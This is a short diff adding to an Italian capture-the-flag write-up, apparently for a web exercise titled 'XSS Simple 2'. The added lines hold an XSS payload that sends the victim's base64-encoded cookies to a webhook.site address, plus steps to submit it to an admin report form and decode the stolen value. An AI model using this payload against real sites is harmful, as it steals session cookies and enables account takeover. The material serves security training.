@@ -24,3 +24,7 @@ Copia l'Indirizzo in alto nella barra degli indirizzi del tuo browser. Dovresti 
 E poi vai nel form "Report an url to the admin" e incolla l'URL lunghissimo che hai appena copiato. Torna sul sito hook e prenditi la flag
 
 -> WS_3.02 - XSS Simple 2
+
+"><script>fetch('https://webhook.site/TUO_ID?c=' + btoa(document.cookie))</script>
+
+Copia l'url e lo metti nel report, e poi vai sull'hook e prenditi la stringa c. Sarà in base64, fai cosi da terminale: echo "valoreDellaStringa" | base64 -d
